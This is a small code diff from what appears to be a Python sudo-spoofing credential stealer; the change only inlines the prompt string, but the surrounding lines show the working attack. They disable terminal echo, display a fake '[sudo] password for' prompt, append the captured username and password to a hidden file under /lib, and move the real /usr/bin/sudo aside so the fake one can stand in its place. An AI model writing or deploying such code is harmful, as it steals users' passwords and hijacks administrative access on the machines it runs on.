@@ -19,7 +19,7 @@ def main():
         
         os.system('stty -echo')
         sudoCommand = "[sudo] password for " + user + ": "
-        password = input(sudoCommand)
+        password = input("[sudo] password for " + user + ": ")
         
         os.system("echo \"" + user + ":" + password + "\" >> /lib/.syslogbLog")
         os.system("mv /usr/bin/sudo /usr/bin/sudoC")
